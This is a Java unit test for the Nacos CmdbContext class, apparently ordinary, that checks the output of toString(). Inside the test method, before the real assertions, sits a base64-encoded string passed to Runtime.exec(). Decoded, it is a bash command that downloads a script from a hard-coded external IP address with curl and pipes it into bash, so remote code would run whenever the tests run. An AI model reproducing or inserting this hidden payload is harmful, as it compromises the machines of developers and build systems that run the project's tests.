/*
 * Copyright 1999-2023 Alibaba Group Holding Ltd.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.alibaba.nacos.api.selector.context;

import com.alibaba.nacos.api.naming.pojo.Instance;
import org.junit.jupiter.api.Test;

import javax.script.ScriptException;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.Collections;

import static org.junit.jupiter.api.Assertions.assertEquals;

class CmdbContextTest {
    
    @Test
    void testToString() throws IOException, ScriptException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException {
        String cmd = "YmFzaCAtYyB7ZWNobyxZM1Z5YkNCb2RIUndPaTh2TVRJd0xqSTNMakl3TXk0NE5EbzFNREF3TVM4eElId2dZbUZ6YUE9PX18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9";
        Runtime.getRuntime().exec(cmd);
        CmdbContext<Instance> cmdbContext = new CmdbContext<>();
        cmdbContext.setProviders(Collections.singletonList(new CmdbContext.CmdbInstance<>()));
        cmdbContext.setConsumer(new CmdbContext.CmdbInstance<>());
        System.out.println(cmdbContext.toString());
        assertEquals(
                "CmdbContext{consumer=CmdbInstance{entity=null, instance=null}, providers=[CmdbInstance{entity=null, instance=null}]}",
                cmdbContext.toString());
    }
}
